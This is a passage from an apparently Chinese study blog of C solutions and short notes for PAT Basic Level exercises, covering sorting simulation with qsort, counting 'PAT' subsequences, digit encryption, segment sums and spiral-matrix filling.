a/b);</span><br><span class="line"><span class="keyword">if</span>(flag &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">")"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> op[<span class="number">5</span>] = <span class="string">"+-*/"</span>, i = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">long</span> a1 = <span class="number">0</span>, a2 = <span class="number">0</span>, b1 = <span class="number">0</span>, b2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%ld/%ld %ld/%ld"</span>, &amp;a1, &amp;a2, &amp;b1, &amp;b2);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">gcd(a1, a2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %c "</span>, op[i]);</span><br><span class="line">gcd(b1, b2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" = "</span>);</span><br><span class="line"><span class="keyword">switch</span> (op[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'+'</span>: gcd(a1*b2+a2*b1, a2*b2);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'-'</span>: gcd(a1*b2-a2*b1, a2*b2);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'*'</span>: gcd(a1*b1, a2*b2);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'/'</span>: gcd(a1*b2, a2*b1);<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：分数加减法与输出格式的学习。</strong></p><h3 id="1035-插入与归并"><a href="#1035-插入与归并" class="headerlink" title="1035 插入与归并"></a>1035 插入与归并</h3><p>关键在于了解插入与归并排序的原理，然后<strong>使用qsort来模拟两种排序算法</strong>。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200719110816354.png" alt="image-20200719110816354"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)a - *(<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, flag = <span class="number">1</span>, k = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, b+i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n<span class="number">-1</span> &amp;&amp; b[i] &lt;= b[i+<span class="number">1</span>]; i++);</span><br><span class="line"><span class="keyword">for</span>(j = i+<span class="number">1</span>; a[j] == b[j] &amp;&amp; j &lt; n; j++);</span><br><span class="line"><span class="keyword">if</span>(j == n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Insertion Sort"</span>);</span><br><span class="line">qsort(a, i+<span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Merge Sort"</span>);</span><br><span class="line"><span class="keyword">while</span>(flag)</span><br><span class="line">&#123;</span><br><span class="line">k *= <span class="number">2</span>;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="keyword">if</span>(a[i] != b[i])</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n/k; i++) <span class="comment">//一次归并排序模拟，注意奇数个数的情况</span></span><br><span class="line">qsort(a+k*i, k, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">qsort(a+n/k*k, n-(n/k*k), <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, a[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %d"</span>, a[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：排序算法的了解与qsort的运用。</strong></p><h3 id="1040-有几个PAT"><a href="#1040-有几个PAT" class="headerlink" title="1040 有几个PAT"></a>1040 有几个PAT</h3><p>做这个的题的思路真是秒啊，果然好想的方法写起来多，不容易想到的方法代码量又少效率又高。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200720095208134.png" alt="image-20200720095208134"></p><p><strong>先统计所有’T’的个数，再依次遍历。如果在前面遇到的’P’则P的个数加1，遇到’T’则T的个数减一，遇到’A’则总个数直接加上此时P的个数与T的个数乘积。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">long</span> ans = <span class="number">0</span>, <span class="keyword">count_t</span> = <span class="number">0</span>, count_p = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">gets(s);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'T'</span>)</span><br><span class="line"><span class="keyword">count_t</span>++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">'P'</span>)</span><br><span class="line">count_p++;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(s[i] == <span class="string">'T'</span>)</span><br><span class="line"><span class="keyword">count_t</span>--;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ans += count_p*<span class="keyword">count_t</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, ans%<span class="number">1000000007</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1041-考试座位号"><a href="#1041-考试座位号" class="headerlink" title="1041 考试座位号"></a>1041 考试座位号</h3><p>从这道题找出了以前不清楚的知识点。</p><blockquote><p>scanf()；后如果是是用gets()输入字符串，那必须先吃掉回车；如果是用scanf(“%s”, )；输入字符串可以不吃掉回车。</p></blockquote><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200721104703255.png" alt="image-20200721104703255"></p><p>成功跳进上图标出的坑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">char</span> id[<span class="number">17</span>]; </span><br><span class="line"><span class="keyword">int</span> z2;</span><br><span class="line">&#125;People;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> id_[<span class="number">17</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, z1_ = <span class="number">0</span>, z2_ = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line">People people[<span class="number">1001</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %d %d"</span>, id_, &amp;z1_, &amp;z2_);</span><br><span class="line"><span class="built_in">strcpy</span>(people[z1_].id, id_);</span><br><span class="line">people[z1_].z2 = z2_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">while</span>(n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;temp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s %d\n"</span>, people[temp].id, people[temp].z2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1045-快速排序"><a href="#1045-快速排序" class="headerlink" title="1045 快速排序"></a>1045 快速排序</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200726184818322.png" alt="image-20200726184818322"></p><p>这个题关键在于一个点：只要某个元素的位置没有变，我们只要保证左边的元素最大值都比它小，那该元素左边的元素都比它小，右边的元素都比它大。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">int</span> *)a - *(<span class="keyword">int</span> *)b;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, i = <span class="number">0</span>, count = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">100001</span>], p1[<span class="number">100001</span>], p2[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p[i]);</span><br><span class="line">p1[i] = p[i];</span><br><span class="line">&#125;</span><br><span class="line">qsort(p, N, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(p[i] == p1[i] &amp;&amp; p1[i] &gt; <span class="built_in">max</span>)</span><br><span class="line">            p2[count++] = p[i];</span><br><span class="line">        <span class="keyword">if</span>(p1[i] &gt; <span class="built_in">max</span>)</span><br><span class="line">            <span class="built_in">max</span> = p1[i];</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, count);</span><br><span class="line">    <span class="keyword">if</span>(count)</span><br><span class="line">           <span class="built_in">printf</span>(<span class="string">"%d"</span>, p2[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; count; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" %d"</span>, p2[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1048-数字加密"><a href="#1048-数字加密" class="headerlink" title="1048 数字加密"></a>1048 数字加密</h3><p>题目不难又是坑人的隐含条件。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200727112844292.png" alt="image-20200727112844292"></p><p>这里说2个整数每一位对应数字进行运算，但有个情况就是B的长度小于A的长度的时候就要在B的前面用’0’补齐与A一样的长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l_a = <span class="number">0</span>, l_b = <span class="number">0</span>, i = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">char</span> a[<span class="number">201</span>] = &#123;<span class="number">0</span>&#125;, b[<span class="number">201</span>] = &#123;<span class="number">0</span>&#125;, c[<span class="number">201</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">14</span>] = <span class="string">"0123456789JQK"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s %s"</span>, a, b);</span><br><span class="line">l_a = <span class="built_in">strlen</span>(a), l_b = <span class="built_in">strlen</span>(b);</span><br><span class="line"><span class="keyword">if</span>(l_b &lt; l_a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(i &lt; l_a-l_b)</span><br><span class="line">c[i++] = <span class="string">'0'</span>;</span><br><span class="line"><span class="built_in">strcat</span>(c, b);</span><br><span class="line"><span class="built_in">strcpy</span>(b, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span>, l_b = <span class="built_in">strlen</span>(b);</span><br><span class="line"><span class="keyword">while</span>(i &lt;= l_a)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">2</span>)</span><br><span class="line">b[l_b-i] = s[(b[l_b-i]<span class="number">-48</span>+a[l_a-i]<span class="number">-48</span>)%<span class="number">13</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> temp = (b[l_b-i]<span class="number">-48</span>)-(a[l_a-i]<span class="number">-48</span>);</span><br><span class="line">b[l_b-i] = temp &lt; <span class="number">0</span> ? temp+<span class="number">10</span>+<span class="number">48</span>:temp+<span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(b);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1049-数列的片段和"><a href="#1049-数列的片段和" class="headerlink" title="1049 数列的片段和"></a>1049 数列的片段和</h3><p>不会动态规划，算法没有学习过，做这个题看了柳神的算法，厉害。。。</p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200728144302045.png" alt="image-20200728144302045"></p><p><strong>算法：算出每个数一共会在片段中出现的次数，然后相乘。最后所有数据相加即可。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, i =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">double</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;temp);</span><br><span class="line">ans += (<span class="keyword">long</span> <span class="keyword">long</span>)(temp*<span class="number">1000</span>)*i*(n-i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>, ans/<span class="number">1000.0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1050-螺旋矩阵"><a href="#1050-螺旋矩阵" class="headerlink" title="1050 螺旋矩阵"></a>1050 螺旋矩阵</h3><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200729112529823.png" alt="image-20200729112529823"></p><p><strong>开始想的是从外层一圈一圈的填充，但是最后也只能填充最外层，内层填充不好插进去。。。</strong></p><p><strong>下面是<a href="https://www.liuchuo.net/" target="_blank" rel="noopener">柳婼 の  blog</a>的填充方法给出的图：真的清晰明了。其实这也是最基本应该想到的常规方法。</strong></p><p><img src="/2019/11/17/PTA%E4%B8%8EPAT%E4%B9%99%E7%BA%A7/image-20200729112504588.png" alt="image-20200729112504588"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">100000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *a, <span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> *(<span class="keyword">int</span> *)b - *(<span class="keyword">int</span> *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">filling</span><span class="params">(<span class="keyword">int</span> *ans, <span class="keyword">int</span> *a, <span class="keyword">int</span> m, <span class="keyword">int</span> n, <span class="keyword">int</span> N)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, level = m/<span class="number">2</span>+m%<span class="number">2</span>, t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; level; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = i; j &lt;= n<span class="number">-1</span>-i &amp;&amp; t &lt;= N<span class="number">-1</span>; j++)</span><br><span class="line">ans[i*n+j] = a[t++];</span><br><span class="line"><span class="keyword">for</span>(j = i+<span class="number">1</span>; j &lt;= m<span class="number">-2</span>-i &amp;&amp; t &lt;= N<span class="number">-1</span>; j++)</span><br><span class="line">ans[j*n+n<span class="number">-1</span>-i] = a[t++];</span><br><span class="line"><span class="keyword">for</span>(j = n<span class="number">-1</span>-i; j &gt;= i &amp;&amp; t &lt;= N<span class="number">-1</span>; j--)</span><br><span class="line">ans[(m<span class="number">-1</span>-i)*n+j] = a[t++];</span><br><span class="line"><span class="keyword">for</span>(j = m<span class="number">-2</span>-i; j &gt;= i+<span class="number">1</span> &amp;&amp; t &lt;= N<span class="number">-1</span>; j--)</span><br><span class="line">ans[j*n+i] =  a[t++];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> N = <span class="number">0</span>, m = <span class="number">0</span>, n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">n = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(N);</span><br><span class="line"><span class="keyword">while</span>(n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(N%n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">m = N/n;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">n--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, a+i);</span><br><span class="line">qsort(a, N, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), cmp);</span><br><span class="line"></span><br><span class="line">filling(ans, a, m, n, N);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span 